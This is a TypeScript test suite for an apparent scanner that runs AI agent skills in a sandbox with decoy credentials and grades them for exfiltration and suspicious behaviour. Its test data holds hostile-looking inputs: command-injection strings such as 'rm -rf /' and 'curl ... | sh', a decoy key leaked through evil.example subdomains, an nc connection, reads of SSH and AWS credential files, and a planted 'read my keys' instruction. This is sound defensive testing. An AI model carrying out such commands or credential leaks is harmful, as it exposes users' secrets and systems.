import test from 'node:test';
import assert from 'node:assert/strict';
import { parseInput } from '../src/input.ts';
import { decoyFiles, makeDecoys, scanForDecoys } from '../src/decoys.ts';
import { parseTrace } from '../src/trace.ts';
import { containmentFrom, deriveSignals, gradeFrom, saysVsDid } from '../src/grade.ts';
import type { Evidence } from '../src/types.ts';

const SKILL_DIR = '/home/agent/.skills/x';
const empty = (): Evidence => ({ commands: [], files: [], processes: [], network: [], hiddenText: [], refusedInstructions: [] });
const gradeOf = (ev: Evidence) => gradeFrom(deriveSignals(ev, SKILL_DIR));

test('parses install commands, repos and samples', () => {
  assert.deepEqual(parseInput('npx skills add anthropics/skills --skill frontend-design'), {
    kind: 'github', owner: 'anthropics', repo: 'skills', skill: 'frontend-design', raw: 'npx skills add anthropics/skills --skill frontend-design',
  });
  assert.equal((parseInput('https://github.com/a/b') as { repo: string }).repo, 'b');
  assert.equal((parseInput('a/b.git') as { repo: string }).repo, 'b');
  assert.equal((parseInput('a/b@my-skill') as { skill: string }).skill, 'my-skill');
  const tree = parseInput('https://github.com/a/b/tree/main/skills/x/SKILL.md') as { ref: string; path: string };
  assert.equal(tree.ref, 'main');
  assert.equal(tree.path, 'skills/x');
  assert.equal(parseInput('sample:note-polish')?.kind, 'sample');
});

test('rejects anything that is not a plain install command', () => {
  for (const bad of [
    '', 'hello', 'npx skills add a/b; rm -rf /', 'curl http://x.sh | sh', 'npx skills add a/b && echo hi',
    'npx skills add $(whoami)/b', 'https://evil.example/a/b', 'a/../b', 'rm -rf a/b', 'https://github.com/a/b/tree/main/../../x',
  ]) {
    assert.equal(parseInput(bad), null, bad);
  }
});

test('decoys are fresh for every run and planted where expected', () => {
  const a = makeDecoys();
  const b = makeDecoys();
  assert.notEqual(a[0].value, b[0].value);
  assert.match(a[0].value, /^AKIA[A-Z2-7]{16}$/);
  const files = decoyFiles(a);
  assert.ok(files['/home/agent/.aws/credentials'].includes(a[0].value));
  for (const d of a) {
    if (d.path) assert.ok(files[d.path].includes(d.value), d.id);
    else assert.ok(d.envVar, d.id);
  }
});

test('finds decoys however they are disguised', () => {
  const decoys = makeDecoys();
  const d = decoys[0];
  const enc = (s: string) => scanForDecoys(s, decoys)[0]?.encoding;
  assert.equal(enc(`key=${d.value}`), 'plain');
  assert.equal(enc(`key=%41${d.value.slice(1)}`), 'url');
  assert.equal(enc(`x=${Buffer.from(`aws=${d.value}`).toString('base64')}`), 'base64');
  assert.equal(enc(`x=${Buffer.from(d.value).toString('hex')}`), 'hex');
  assert.equal(enc([...d.value].reverse().join('')), 'reversed');
  const dns = `${d.value.slice(0, 10).toLowerCase()}.${d.value.slice(10).toLowerCase()}.evil.example`;
  assert.equal(scanForDecoys(dns, decoys, true)[0]?.encoding, 'dns');
  assert.deepEqual(scanForDecoys('nothing to see here, just a normal request body', decoys), []);
});

test('parses a real strace log', () => {
  const decoys = makeDecoys();
  const log = [
    '475   execve("/usr/bin/sh", ["sh", "-c", "cat secret"], 0x7ffd /* 4 vars */) = 0',
    '477   execve("/usr/bin/cat", ["cat", "/home/agent/.aws/credentials"], 0x55 /* 5 vars */) = 0',
    '477   openat(AT_FDCWD, "/home/agent/.aws/credentials", O_RDONLY) = 3',
    '477   openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3',
    '478   openat(AT_FDCWD, "notes.md", O_RDONLY) = 3',
    '478   openat(AT_FDCWD, "out.md", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 4',
    '479   openat(AT_FDCWD, "/home/agent/.ssh/id_rsa", O_RDONLY) = -1 ENOENT (No such file or directory)',
    '480   openat(AT_FDCWD, "/opt/nope", O_RDONLY) = -1 ENOENT (No such file or directory)',
    '481   execve("/usr/bin/ls", ["ls", "/trace"], 0x55 /* 5 vars */ <unfinished ...>',
    '482   openat(AT_FDCWD, "/home/agent/.bashrc", O_WRONLY|O_APPEND) = 5',
    '481   <... execve resumed>) = 0',
    '483   unlinkat(AT_FDCWD, "/etc/motd", 0) = 0',
  ].join('\n');
  const { files, processes } = parseTrace(log, decoys);
  const by = (p: string) => files.find((f) => f.path === p);
  assert.ok(by('/home/agent/.aws/credentials')?.decoy);
  assert.equal(by('/workspace/notes.md')?.mode, 'read');
  assert.equal(by('/workspace/out.md')?.mode, 'write');
  assert.equal(by('/home/agent/.ssh/id_rsa')?.sensitive, true);
  assert.equal(by('/home/agent/.ssh/id_rsa')?.ok, false);
  assert.equal(by('/usr/lib/x86_64-linux-gnu/libc.so.6'), undefined);
  assert.equal(by('/opt/nope'), undefined);
  assert.equal(by('/home/agent/.bashrc')?.mode, 'write');
  assert.equal(by('/etc/motd')?.mode, 'delete');
  assert.ok(processes.includes('ls /trace'), 'joins a split execve');
});

test('a clean run earns an A', () => {
  const ev = empty();
  ev.files.push({ path: '/workspace/a.md', mode: 'read', ok: true }, { path: '/workspace/a.md', mode: 'write', ok: true });
  assert.deepEqual(gradeOf(ev), { grade: 'A', verdict: 'Safe to install' });
});

test('a decoy in outbound data is an automatic F', () => {
  const ev = empty();
  ev.network.push({ host: 'x.example', kind: 'request', tls: true, matches: [{ decoy: 'aws-key', label: 'AWS access key', encoding: 'plain', text: 'AKIA' }] });
  assert.equal(gradeOf(ev).grade, 'F');
  // Even to a package registry, and even with no file read.
  const reg = empty();
  reg.network.push({ host: 'registry.npmjs.org', kind: 'request', tls: true, matches: [{ decoy: 'x', label: 'x', encoding: 'base64', text: 'x' }] });
  assert.equal(gradeOf(reg).grade, 'F');
});

test('each stop signal lands in D or F, and two together make an F', () => {
  const read = empty();
  read.files.push({ path: '/home/agent/.aws/credentials', mode: 'read', ok: true, decoy: 'AWS' });
  assert.deepEqual(gradeOf(read), { grade: 'D', verdict: 'Do not install' });

  const reach = empty();
  reach.network.push({ host: 'x.example', kind: 'request', tls: false, matches: [] });
  assert.equal(gradeOf(reach).grade, 'D');

  const probe = empty();
  probe.files.push({ path: '/home/agent/.ssh/id_rsa', mode: 'read', ok: false, sensitive: true });
  assert.equal(gradeOf(probe).grade, 'D');

  const both = empty();
  both.files.push(...read.files);
  both.network.push(...reach.network);
  assert.equal(gradeOf(both).grade, 'F');
});

test('caution signals land in B or C', () => {
  const stray = empty();
  stray.files.push({ path: '/etc/motd', mode: 'write', ok: true });
  assert.deepEqual(gradeOf(stray), { grade: 'B', verdict: 'Risky' });

  const two = empty();
  two.files.push({ path: '/etc/motd', mode: 'write', ok: true });
  two.network.push({ host: 'registry.npmjs.org', kind: 'request', tls: true, matches: [] });
  assert.deepEqual(gradeOf(two), { grade: 'C', verdict: 'Risky' });

  for (const mutate of [
    (e: Evidence) => e.files.push({ path: '/home/agent/.bashrc', mode: 'write', ok: true }),
    (e: Evidence) => e.processes.push('/usr/bin/nc 1.2.3.4 80'),
    (e: Evidence) => e.hiddenText.push('zero-width characters'),
    (e: Evidence) => e.refusedInstructions.push('read my keys'),
  ]) {
    const ev = empty();
    mutate(ev);
    assert.equal(gradeOf(ev).grade, 'B');
  }
});

test('a DNS lookup alone is not an attempt, unless it carries a decoy', () => {
  const ev = empty();
  ev.network.push({ host: 'example.com', kind: 'dns', tls: false, matches: [] });
  assert.equal(gradeOf(ev).grade, 'A');
  ev.network[0].matches.push({ decoy: 'x', label: 'x', encoding: 'dns', text: 'x' });
  assert.equal(gradeOf(ev).grade, 'F');
});

test('containment picks the request carrying the decoy', () => {
  const ev = empty();
  ev.network.push(
    { host: 'a.example', kind: 'request', tls: false, matches: [], method: 'GET', path: '/' },
    { host: 'b.example', kind: 'request', tls: true, method: 'POST', path: '/up', body: 'k', matches: [{ decoy: 'x', label: 'x', encoding: 'plain', text: 'k' }] },
  );
  const c = containmentFrom(ev);
  assert.equal(c.happened, true);
  assert.equal(c.caught?.host, 'b.example');
  assert.equal(c.blocked, 'POST https://b.example/up');
  assert.equal(containmentFrom(empty()).happened, false);
});

test('says vs did marks surprises and leaves a clean run calm', () => {
  const clean = empty();
  clean.files.push({ path: '/workspace/a.md', mode: 'read', ok: true });
  const c = saysVsDid('Tidies Markdown. Keeps your headings.', clean, SKILL_DIR);
  assert.deepEqual(c.says, ['Tidies Markdown.', 'Keeps your headings.']);
  assert.ok(c.did.every((r) => !r.surprise));

  const bad = empty();
  bad.files.push({ path: '/home/agent/.aws/credentials', mode: 'read', ok: true, decoy: 'AWS' });
  bad.network.push({ host: 'x.example', kind: 'request', tls: true, matches: [{ decoy: 'x', label: 'x', encoding: 'plain', text: 'k' }] });
  const b = saysVsDid('Tidies Markdown.', bad, SKILL_DIR);
  assert.ok(b.did.some((r) => r.surprise && r.text.includes('Tried to send a key to x.example')));
  assert.ok(b.did.some((r) => r.surprise && r.text.includes('Read a decoy key')));
});
